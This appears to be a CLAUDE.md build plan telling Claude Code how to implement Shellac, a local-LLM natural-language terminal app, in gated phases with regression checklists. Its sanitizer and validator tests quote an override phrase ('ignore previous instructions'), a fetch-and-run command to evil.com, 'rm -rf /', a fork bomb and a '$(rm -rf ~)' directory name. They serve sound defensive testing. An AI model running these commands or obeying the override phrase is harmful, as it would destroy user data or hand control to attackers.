# CLAUDE.md — Shellac
**Boss Button Studios**
**For**: Claude Code
**Spec**: `Shellac_spec.md` (read this first, in full, before writing any code)

---

## Your role

You are the implementation engineer for Shellac. The architect (Jarrod) has completed the design. Your job is to build it faithfully against the spec, in the order defined here, leaving clear regression evidence at each gate.

You are not making architectural decisions. If something in the spec is ambiguous, stop and ask before proceeding. Do not invent solutions to problems that aren't in the spec — flag them instead.

**Before touching any sensitive module** (PTYManager, ContextSanitizer, CommandValidator, the security configuration block in `electron/main.ts`), write a brief plain-English description of what you are about to do and why. Wait for confirmation before proceeding.

---

## Non-negotiables

These constraints come from the spec. Treat any temptation to work around them as a bug in your reasoning, not a constraint to relax.

- `node-pty` is main process only. No exceptions.
- `@anthropic-ai/sdk` does not exist in this project. Do not install it.
- No telemetry, analytics, or crash reporting of any kind. If a library wants to phone home, it does not ship.
- `ansi-to-html` must always be instantiated with `escapeXML: true`. Always.
- `PTY_WRITE` IPC handler strips everything after the first newline. One command per call.
- `ContextBudget.fitBlocks()` uses command + exitCode only. stdout never enters a prompt by default.
- All paths sent to PTY are shell-quoted via `shell-quote` before `ptyWrite`.
- IPC channel names come from `IPC` constants in `src/types/index.ts`. Never hardcode strings.
- Commands are never auto-executed except Navigator `cd` — and that carve-out is documented in §15 of the spec with rationale. Do not add new auto-execute paths.
- `electron-builder` config must include `"publish": null`.

If you find yourself about to violate any of the above, stop and explain why before proceeding.

---

## How to leave regression evidence

After each phase gate, create a file in `test_results/` named `regression_stepNN.txt`. It must contain:

1. What was tested
2. How it was tested (command run, interaction performed, or code path exercised)
3. Result (pass / fail / partial)
4. Any unexpected behavior observed — even if it passed

Do not skip regression files. Do not write them before the tests pass. They are the audit trail.

For automated tests, run them and paste the output. For manual/interactive tests, describe exactly what you did and what you observed.

---

## Project structure reminder

```
/
├── installer/          ← First-run Ollama + model installer
├── electron/           ← Main process (PTY, config)
├── src/
│   ├── components/     ← React UI
│   ├── lib/            ← AI, context, validation logic
│   ├── styles/         ← Design tokens
│   └── types/          ← index.ts (write first, freeze early)
├── assets/             ← glossary.json, system-dirs.json
└── test_results/       ← Regression evidence (create this directory)
```

---

## Build phases

Work through these phases in order. Do not begin a phase until the previous phase's regression gate passes. Each phase ends with a named regression file.

---

### Phase 0 — Foundation
**Goal**: Types frozen, security config verified, real shell spawning.

**Steps**:
1. Scaffold: `npm create electron-vite@latest shellac -- --template react-ts`
2. Create `test_results/` directory
3. Write `src/types/index.ts` in full — all types, error classes, IPC constants, `DEFAULT_CONFIG`. This file is frozen after this phase. Changes require explicit instruction.
4. Write `electron/main.ts` security configuration block:
   - `BrowserWindow` with all security flags from spec §8a
   - CSP header from spec §8b
   - `PTY_WRITE` newline-stripping handler from spec §8c
   - Config Zod schema and `loadConfig()` from spec §8d
5. Write `preload.ts` — expose only the IPC surface listed in spec §17

**Do not write any other files until this gate passes.**

**Regression gate** → `test_results/regression_step00.txt`
- [ ] `npm run dev` starts without Electron security warnings in console
- [ ] CSP header is present and correct (verify via devtools Network tab)
- [ ] `src/types/index.ts` compiles with zero TypeScript errors
- [ ] `IPC` object contains exactly the channels in the spec — no extras, none missing

---

### Phase 1 — PTY + Terminal Core
**Goal**: Real shell running in xterm. Blocks render.

**Steps**:
1. Write PTYManager section of `electron/main.ts`:
   - Shell spawn with CWD hook injection (spec §15)
   - `onData` handler with OSC CWD stripping
   - `PTY_WRITE`, `PTY_RESIZE` IPC handlers
   - Register Electron application menu with Edit submenu (Copy / Paste / Select All) using platform accelerators — required for clipboard bridge in sandboxed renderer (spec §17 clipboard)
2. Write `src/lib/BlockStore.ts` — full Zustand store with instance UUID and 200-block cap
3. Write `src/components/Terminal.tsx` — xterm.js only (no blocks yet). Wire PTY data in and keyboard data out. Verify with `console.log` before touching xterm.
   - `copyOnSelect: true` on xterm instance
   - Keyboard handler: `Cmd+C` / `Ctrl+Shift+C` → `terminal.getSelection()` → `navigator.clipboard.writeText()`
   - Keyboard handler: `Cmd+V` / `Ctrl+Shift+V` → `navigator.clipboard.readText()` → `ptyWrite(text)`
   - `Ctrl+C` is NOT wired to SIGINT — Stop button is the only SIGINT path
4. Write `src/components/TerminalBlock.tsx` — render with static mock data first, then wire to store. Include "Help me fix this" button stub (visible but non-functional at this stage).
5. Add Stop button to Terminal layout — visible when `activeBlockId` is set, hidden otherwise. Calls `ptyWrite('\x03')`. NLBar hidden/disabled while Stop button is showing.

**Regression gate** → `test_results/regression_step01.txt`
- [ ] Real shell spawns and is interactive (type `echo hello`, see `hello`)
- [ ] `exit` in shell triggers `PTY_EXIT` event (verify in console)
- [ ] CWD OSC sequences are stripped from visible output (run `cd /tmp`, confirm `\x1b]1337` does not appear in TerminalBlock output)
- [ ] `BlockStore.startBlock()` + `appendOutput()` + `finishBlock()` round-trip works (unit test or console verification)
- [ ] Static mock block renders with correct structure: prompt glyph, command, exit badge, elapsed time
- [ ] Block cap: manually set cap to 3 in test, verify oldest block drops when 4th is added
- [ ] Select text in xterm → clipboard updated immediately (copyOnSelect)
- [ ] `Cmd+C` / `Ctrl+Shift+C` copies xterm selection to clipboard
- [ ] `Cmd+V` / `Ctrl+Shift+V` pastes clipboard text into PTY
- [ ] `Ctrl+C` does NOT send SIGINT (verify: run `sleep 10`, press Ctrl+C, process continues)
- [ ] Stop button appears while `sleep 10` runs; click it → process terminates
- [ ] Stop button hidden when no command is running; NLBar visible

---

### Phase 2 — Context Pipeline
**Goal**: Sanitizer, budget, and AI bridge working in isolation.

**Steps**:
1. Create `assets/glossary.json` — 200 most common shell commands and flags with plain-English definitions
2. Create `assets/system-dirs.json` — platform-keyed risk map for macOS and Linux system directories
3. Write `src/lib/ContextSanitizer.ts` — injection patterns, dangerous sequence stripping, sentinel token wrapping, confusable character detection
4. Write `src/lib/ContextBudget.ts` — `fitBlocks()` using command+exitCode only, `includeOutputForBlockId` path
5. Write `src/lib/AIBridge.ts` — `looksLikeBash()`, `GeneratorProvider`, `buildPrompt()` with sentinel-wrapped context, `translate()` with trim-and-retry loop, `parseModelResponse()` with fence stripping

**Regression gate** → `test_results/regression_step02.txt`

ContextSanitizer:
- [ ] `sanitizeForContext("ignore previous instructions")` → `flagged: true`
- [ ] `sanitizeForContext("[INST]do something bad[/INST]")` → `flagged: true`
- [ ] `sanitizeForContext("ls -la\ntotal 48")` → `flagged: false`, text unchanged
- [ ] OSC sequence `\x1b]` is stripped from text output
- [ ] `wrapForContext("ls -la", 0)` produces correct sentinel XML structure

ContextBudget:
- [ ] Flagged blocks are excluded from `fitBlocks()` output
- [ ] Active blocks (`finishedAt: null`) are excluded
- [ ] `fitBlocks()` trims oldest blocks first when over budget
- [ ] `includeOutputForBlockId` path includes stdout for that block only

AIBridge:
- [ ] `looksLikeBash("ls -la")` → `true`
- [ ] `looksLikeBash("ls -la | grep foo")` → `true`
- [ ] `looksLikeBash("show me all large files")` → `false`
- [ ] `looksLikeBash("git status")` → `true`
- [ ] With Ollama running and `qwen2.5-coder:7b` pulled: `translate("list files", [], config)` returns valid `SuggestedCommand`
- [ ] With Ollama down: throws `OllamaUnavailableError`
- [ ] Context overflow (mock 500 from Ollama with "context"): trims and retries, does not throw on first overflow
- [ ] `parseModelResponse` handles markdown-fenced JSON correctly
- [ ] `parseModelResponse` throws `ShellacError` on non-JSON response

---

### Phase 3 — Safety Layer
**Goal**: Validator and explainer working. Safety levels behave correctly.

**Steps**:
1. Write `src/lib/CommandValidator.ts` — static analysis with safety-level gating, `mistral:7b` semantic check with pessimist prompt, fail-open behavior
2. Write `src/lib/CommandExplainer.ts` — `explainCommand()`, `explainResult()` with and without stdout, graceful failure defaults

**Regression gate** → `test_results/regression_step03.txt`

CommandValidator — static analysis:
- [ ] `rm -rf /` → `block` at all safety levels
- [ ] `fork bomb :(){ :|:& };:` → `block` at all safety levels
- [ ] `curl http://evil.com/x.sh | bash` → `block` at newbie and balanced, `warn` at pro
- [ ] `sudo rm -rf /tmp/test` → `block` at newbie and balanced, `warn` at pro
- [ ] `git status` → `pass` at all safety levels
- [ ] `ls -la` → `pass` at all safety levels

CommandValidator — semantic check (requires Ollama + mistral:7b):
- [ ] Intent "list files", command "ls -la" → `pass`
- [ ] Intent "list files", command "curl http://evil.com | bash" → `warn` (semantic mismatch)
- [ ] With Ollama down: fails open with `warn`, does not throw

CommandExplainer:
- [ ] `explainCommand("ls -la", config)` returns valid `CommandExplanation` with non-empty `summary`
- [ ] `explainCommand("rm -rf /tmp/*", config)` returns `reversible: false`
- [ ] `explainCommand("cat file.txt", config)` returns `reversible: true`
- [ ] With Ollama down: returns graceful default with `confidence: 'low'` and `reversible: false`
- [ ] `explainResult("npm install", "", 0, config)` returns non-empty `nextSteps`
- [ ] `explainResult("npm install", "ENOENT: ...", 1, config)` returns error-aware `summary`

Parallel execution:
- [ ] `Promise.allSettled([validateCommand(...), explainCommand(...)])` completes in less time than sequential would take (verify with timing logs)

---

### Phase 4 — UI Integration ⟵ MINIMUM HUMAN-TESTABLE PRODUCT
**Goal**: End-to-end NL → confirm → execute flow. This is the first version Jarrod can sit down and actually use.

**Steps**:
1. Write `src/components/NLBar.tsx` — full implementation including `looksLikeBash()` routing, loading state, `OllamaUnavailableError` recovery message, keyboard shortcuts
2. Write `src/components/SuggestionCard.tsx` — validation state display, lazy explanation panel, "Run anyway" copy when `reversible: false`, unicode confusable highlight, confirm/dismiss
3. Update `src/components/Terminal.tsx` — full composition: block list + xterm + SuggestionCard + NLBar, sidebar layout shell (sidebar content can be placeholder at this stage)
4. Wire "Help me fix this" button in `TerminalBlock.tsx` to `explainResult()` with stdout

**Regression gate** → `test_results/regression_step04.txt`

End-to-end flows:
- [ ] Type "list files" in NLBar → suggestion appears with `ls` variant, explanation loads
- [ ] Type `git status` in NLBar → `looksLikeBash` routes directly, `source: 'direct'` badge shown
- [ ] Confirm a safe suggestion → command executes in xterm, block created with correct NL label
- [ ] Dismiss a suggestion → NLBar clears, focus returns to xterm
- [ ] Escape during loading → in-flight request cancels, loading state clears
- [ ] Cmd+K / Ctrl+K → focuses NLBar from anywhere
- [ ] Type `rm -rf /` in NLBar → `looksLikeBash` routes it, validator shows `block` state, Run button disabled

Validation UI:
- [ ] Safe command → normal SuggestionCard appearance
- [ ] Warn command → amber border, warning message, Run still enabled
- [ ] Block command → red border, Run button disabled, reason shown
- [ ] Edit a blocked command to safe → re-validates, block state clears

Error recovery:
- [ ] Stop Ollama (`ollama stop`), submit NL query → recovery message with `ollama serve` shown, query preserved
- [ ] Restart Ollama, submit same query → works normally

"Help me fix this":
- [ ] Run a command that fails (e.g. `cat nonexistent.txt`) → button appears on block
- [ ] Click button → `explainResult()` called with stdout, explanation appears in sidebar Explain tab

---

### Phase 5 — Sidebar
**Goal**: All four tabs functional.

**Steps**:
1. Write `src/components/sidebar/Sidebar.tsx` — tab shell, resize divider, `Cmd+B` toggle, width persistence
2. Write `src/components/sidebar/ExplainTab.tsx` — three states (pre-run, post-run, idle), welcome panel on first launch
3. Write `src/components/sidebar/NavigatorTab.tsx` — CWD tracking, session tree, system-dirs risk display, auto-execute `cd` with `shell-quote`
4. Write `src/components/sidebar/GlossaryTab.tsx` — `glossary.json` lookup, rate-limited background Ollama calls (5/min), live search
5. Write `src/components/sidebar/SettingsTab.tsx` — Ollama status, safety level, explain mode, sidebar default, font size, theme. No API key field.

**Regression gate** → `test_results/regression_step05.txt`

Explain tab:
- [ ] Before confirming a suggestion → pre-run explanation shown with effects, reversible indicator
- [ ] `reversible: false` → "Cannot be undone." shown in amber text (words, not dot)
- [ ] After command completes → post-run summary and next steps shown
- [ ] First launch (no blocks yet) → welcome panel visible

Navigate tab:
- [ ] `cd ~/Documents` in shell → breadcrumb updates, tree highlights new directory
- [ ] Click a visited directory in tree → `cd /full/path` executes immediately, no SuggestionCard
- [ ] Click `/etc` → system territory callout shown in Explain tab, click still executes `cd` but with confirm
- [ ] Symlink to `/etc` from home dir → treated as system territory
- [ ] Directory named `$(rm -rf ~)` → shell-quote prevents execution of subshell

Glossary tab:
- [ ] Run `find . -name "*.ts"` → `find`, `-name` entries appear in glossary
- [ ] Search "find" → filters to find entry
- [ ] Trigger 10 unknown tokens in rapid succession → rate limiter caps background calls, no freeze
- [ ] Glossary resets on app restart

Settings tab:
- [ ] Safety level change persists after restart
- [ ] Font size slider updates xterm font in real time
- [ ] No API key field exists anywhere in the settings UI
- [ ] Ollama unreachable → red indicator shown with `ollama serve` command

Sidebar:
- [ ] `Cmd+B` / `Ctrl+B` toggles sidebar
- [ ] Drag divider → width persists after restart
- [ ] `autoSwitchToExplain: true` → sidebar jumps to Explain tab when suggestion appears

---

### Phase 6 — Installer + Design Polish
**Goal**: Fresh-machine install works. Design tokens applied throughout.

**Steps**:
1. Write `installer/ollama-urls.ts` — pinned Ollama version, both model names
2. Write `installer/install.ts` — full orchestration: Ollama detection, download, daemon start, model pull
3. Write `installer/progress.tsx` — four-row progress UI with per-step status and error recovery display
4. Apply `src/styles/tokens.ts` throughout all components — replace any hardcoded colors or radii
5. Apply `xtermTheme` to xterm instance
6. Verify `electron-builder.config.js` has `"publish": null`

**Regression gate** → `test_results/regression_step06.txt`

Installer — three scenarios (test each):
- [ ] **Scenario A (clean machine)**: No Ollama installed. Installer detects absence, downloads, installs, starts daemon, pulls both models, completes. App opens into working terminal.
- [ ] **Scenario B (Ollama present, no models)**: Ollama installed but neither model pulled. Installer skips download, pulls both models, completes.
- [ ] **Scenario C (fully pre-installed)**: Both Ollama and both models present. Progress screen visible for under 2 seconds. App opens immediately.
- [ ] Network failure mid-pull → progress screen shows amber error row with copyable recovery command, does not show raw stack trace

Design tokens:
- [ ] Dark theme: all surfaces use token colors, no hardcoded hex values in component files
- [ ] Light theme: switch in settings, all surfaces update correctly
- [ ] System theme: matches OS appearance preference
- [ ] xterm cursor is accent color (`#C4844A`)
- [ ] Block output area has amber left border

Config persistence:
- [ ] Change font size, restart → font size restored
- [ ] Change safety level, restart → safety level restored
- [ ] Change theme, restart → theme restored
- [ ] Delete config file, restart → `DEFAULT_CONFIG` values used, no crash

---

### Phase 7 — Packaging
**Goal**: Distributable builds for both platforms. Installer works on clean VMs.

**Steps**:
1. Configure `electron-builder.config.js` — macOS dmg + Linux AppImage targets, `"publish": null`
2. Build macOS dmg: `npm run build:mac`
3. Build Linux AppImage: `npm run build:linux`
4. Test each on a clean VM with no pre-existing Ollama or models

**Regression gate** → `test_results/regression_step07.txt`
- [ ] macOS dmg installs via drag-to-Applications
- [ ] macOS: first launch runs installer, both models pull, terminal opens
- [ ] Linux AppImage runs without installation
- [ ] Linux: first launch detects missing Ollama, installs it, both models pull, terminal opens
- [ ] Neither build makes any outbound network call except to `github.com/ollama/ollama/releases` during installer and `localhost:11434` during operation
- [ ] `"publish": null` confirmed in build output — no auto-update check

---

## Minimum Human-Testable Product (MHTP)

**Definition**: Phase 4 complete.

At MHTP, Jarrod can:
- Open Shellac and have a real interactive shell
- Type natural language and get suggested commands with explanations
- Type plain bash and have it pass through directly
- Confirm, edit, or dismiss suggestions
- See commands and output organized into blocks
- Encounter dangerous commands and see them blocked or warned by safety level
- Get recovery guidance when Ollama is unavailable

The sidebar will be placeholder. The installer will not exist. Jarrod sets up Ollama manually for this milestone. That is acceptable — the core value proposition is testable without them.

**MHTP does not require**: sidebar functionality, the installer, design token polish, config persistence, or packaging.

---

## Playtesting plan

### Playtest 1 — Internal (after Phase 4: MHTP)
**Who**: Jarrod + one other developer familiar with the terminal
**What to test**:
- Core NL→shell flow across 20+ different natural language queries
- Bash passthrough for common developer commands
- Safety level behavior at all three levels
- OllamaUnavailableError recovery
- "Help me fix this" on failed commands

**What to record**:
- Every query that produced a wrong, confusing, or dangerous suggestion
- Every UI moment that felt slow, unclear, or broken
- The five most useful things and the five most annoying things

**Gate to Phase 5**: at least 80% of NL queries produce a command the user would confirm without editing. If below that threshold, improve `buildPrompt()` and `parseModelResponse()` before building the sidebar.

---

### Playtest 2 — Neophyte (after Phase 5: Sidebar complete)
**Who**: 2–3 people who use Windows daily and have minimal terminal experience
**Setup**: Clean machine. Shellac installed. No instructions given beyond "use this to work in your terminal."
**What to observe** (watch silently, do not help):
- Do they find the NLBar without being told?
- Do they read the Explain tab before confirming?
- Does "Cannot be undone." stop them from confirming destructive commands?
- Do they understand what the Navigator is showing them?
- Where do they get stuck?
- What do they try that doesn't work?

**What to record**:
- Every point of confusion or hesitation
- Every unexpected behavior that surprised them
- Whether they felt the tool was safe to use
- Whether they felt they were learning anything

**Gate to Phase 6**: neophyte users successfully complete at least 3 self-directed terminal tasks without assistance and without executing any destructive commands unintentionally. If they can't, fix the UX before polishing.

---

### Playtest 3 — Power User (after Phase 6: Polish complete)
**Who**: 1–2 developers who live in the terminal (zsh power users, vim users, heavy git users)
**What to test**:
- Does bash passthrough feel fast enough to not be annoying?
- Does the sidebar stay out of the way (or does it close it immediately)?
- Does the safety level at `pro` feel unobtrusive?
- Would they actually use this instead of iTerm2 / Alacritty for daily work?
- What's missing that would make it a daily driver?

**Gate to Phase 7 (packaging)**: at least one power user says they would use it. If not, their feedback drives the pre-release backlog.

---

## Notes for Claude Code

- The spec is the source of truth. This file is the work order. When they conflict, flag it — do not resolve it yourself.
- Write tests before wiring UI. A component that renders but whose underlying lib isn't tested is a liability.
- Regression files are not optional. They are the artifact that lets Jarrod know a phase is actually done.
- The installer is tested last in the build sequence but it matters enormously — it is the first thing a real user experiences. Treat it with the same care as the security configuration.
- When in doubt about the right behavior for a neophyte user, err toward more explanation and more friction. When in doubt about the right behavior for a pro user, err toward less.
- The name is Shellac. The studio is Boss Button Studios. Both appear in the about panel and the window title.
